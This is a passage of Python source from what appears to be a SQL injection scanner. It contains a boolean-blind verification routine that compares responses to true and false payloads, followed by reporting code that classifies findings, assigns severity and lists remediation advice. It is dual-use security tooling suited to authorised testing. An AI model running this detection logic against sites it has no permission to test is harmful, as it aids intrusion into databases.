    false_runs = _collect_attempts(_send_false, normalize_response, attempts=verify_attempts, sleep_between=sleep_between)

    if len(true_runs) < 2 or len(false_runs) < 2:
        details = {
            "verified": False,
            "evidence": "not-enough-samples-for-boolean-verify",
            "true": {"runs": len(true_runs)},
            "false": {"runs": len(false_runs)}
        }
        return details if return_details else False

    true_ok, true_ev = _is_consistent(
        true_runs,
        max_len_delta=max_len_delta,
        require_same_status=True,
        require_same_sql_error_flag=False,
        similarity_threshold=similarity_threshold
    )
    false_ok, false_ev = _is_consistent(
        false_runs,
        max_len_delta=max_len_delta,
        require_same_status=True,
        require_same_sql_error_flag=False,
        similarity_threshold=similarity_threshold
    )

    if not true_ok or not false_ok:
        details = {
            "verified": False,
            "evidence": "unstable-responses-boolean-verify",
            "true": {"ok": true_ok, "evidence": true_ev},
            "false": {"ok": false_ok, "evidence": false_ev}
        }
        return details if return_details else False

    t = true_runs[-1]
    f = false_runs[-1]

    status_diff = (t["status"] != f["status"])
    sqlerr_diff = (t["has_sql_error"] != f["has_sql_error"])

    bt = normalize_response(base_text or "") if normalize_response else (base_text or "")
    base_len = len(bt)
    dyn_thresh = max(30, int(base_len * 0.03))

    len_diff = abs(t["length"] - f["length"])
    length_diff = (len_diff > max(dyn_thresh, 30))

    sim_tf = difflib.SequenceMatcher(None, t["body_norm"], f["body_norm"]).ratio()
    body_diff = (sim_tf < similarity_threshold)

    # Stronger confirm: true must look closer to baseline than false (when baseline available)
    sim_base_true = difflib.SequenceMatcher(None, bt, t["body_norm"]).ratio() if bt else None
    sim_base_false = difflib.SequenceMatcher(None, bt, f["body_norm"]).ratio() if bt else None
    baseline_rule = True
    if bt:
        baseline_rule = (sim_base_true >= sim_base_false)

    confirmed = (baseline_rule and (status_diff or length_diff or body_diff or sqlerr_diff))

    evidence = (
        f"boolean-verify: true[{true_ev}] vs false[{false_ev}] | "
        f"compare: status_diff={status_diff}, len_diff={len_diff} (thresh={max(dyn_thresh,30)}), "
        f"sim_tf={sim_tf:.3f}, sqlerr_diff={sqlerr_diff}, "
        f"sim_base_true={None if sim_base_true is None else round(sim_base_true,3)}, "
        f"sim_base_false={None if sim_base_false is None else round(sim_base_false,3)}"
    )

    details = {
        "verified": bool(confirmed),
        "evidence": evidence,
        "payloads": {"true": true_p, "false": false_p},
        "metrics": {
            "status_true": t["status"],
            "status_false": f["status"],
            "len_true": t["length"],
            "len_false": f["length"],
            "len_diff": len_diff,
            "baseline_len": base_len,
            "sim_true_false": sim_tf,
            "sim_base_true": sim_base_true,
            "sim_base_false": sim_base_false,
            "sqlerr_true": t["has_sql_error"],
            "sqlerr_false": f["has_sql_error"]
        }
    }

    return details if return_details else bool(confirmed)


# ============================================================
# 8) Phase 7 — Advanced SQLi Reporting (Classification + Severity)
# ============================================================

def _map_phase_to_type(phase: str, vuln_type: str = "") -> str:
    p = (phase or "").strip().lower()
    vt = (vuln_type or "").strip().lower()

    if p in ("union", "union-based", "sqli-union"):
        return "UNION-based"
    if p in ("time", "time-based", "time_sqli"):
        return "Time-based"
    if p in ("blind", "boolean", "boolean-blind", "blind-based"):
        return "Blind-based"
    if p in ("error", "error-based"):
        return "Error-based"

    if "union" in vt:
        return "UNION-based"
    if "time" in vt:
        return "Time-based"
    if "blind" in vt or "boolean" in vt:
        return "Blind-based"
    if "error" in vt:
        return "Error-based"

    return "Unknown"


def _severity_from_type(vtype: str) -> str:
    t = (vtype or "").strip().lower()
    if "union" in t:
        return "High"
    if "time" in t:
        return "High"
    if "blind" in t:
        return "Medium"
    if "error" in t:
        return "Low"
    return "Low"


def _default_recommendations() -> list:
    return [
        "Use Prepared Statements",
        "Use Parameterized Queries",
        "Validate and sanitize user input",
        "Apply least privilege to database users",
        "Use allow-lists for expected input formats where possible",
        "Enable safe error handling (avoid verbose DB errors in responses)"
    ]


def enrich_sqli_finding_for_report(finding: dict) -> dict:
    if not isinstance(finding, dict):
        return finding

    phase = finding.get("phase", "")
    vuln_type = finding.get("vuln_type", "")

    report_type = _map_phase_to_type(phase=phase, vuln_type=vuln_type)
    severity = _severity_from_type(report_type)

    evidence = finding.get("evidence")
    if not evidence:
        v = finding.get("verify") or {}
        evidence = v.get("evidence") or finding.get("reason") or ""

    finding.setdefault("evidence", evidence)
    finding["report_type"] = report_type
    finding["severity"] = severity
    finding.setdefault("recommendations", _default_recommendations())

    return finding


def enrich_sqli_findings_list(findings: list) -> list:
    if not findings:
        return findings or []
    return [enrich_sqli_finding_for_report(f) for f in findings]

